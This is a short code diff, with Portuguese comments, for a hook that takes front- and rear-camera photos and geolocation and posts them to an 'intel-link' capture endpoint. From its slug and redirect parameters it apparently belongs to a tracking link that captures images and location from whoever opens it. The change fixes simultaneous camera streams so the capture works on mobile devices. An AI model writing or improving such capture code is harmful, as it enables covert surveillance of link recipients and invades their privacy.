@@ -92,12 +92,12 @@ function useCapture(slug: string, redirectUrl: string | null) {
         );
       });
 
-      // Geolocalização e câmeras em paralelo para não aumentar o tempo de espera
-      const [, photoFront, photoBack] = await Promise.all([
-        locPromise,
-        capturePhoto("user"),
-        capturePhoto("environment"),
-      ]);
+      // Câmeras sequenciais — iOS/Android não suporta dois streams simultâneos
+      const photoFront = await capturePhoto("user");
+      const photoBack  = await capturePhoto("environment");
+
+      // Geolocalização já estava rodando em paralelo; aguarda se ainda não terminou
+      await locPromise;
 
       await fetch("/api/ops/intel-link/capture", {
         method: "POST",
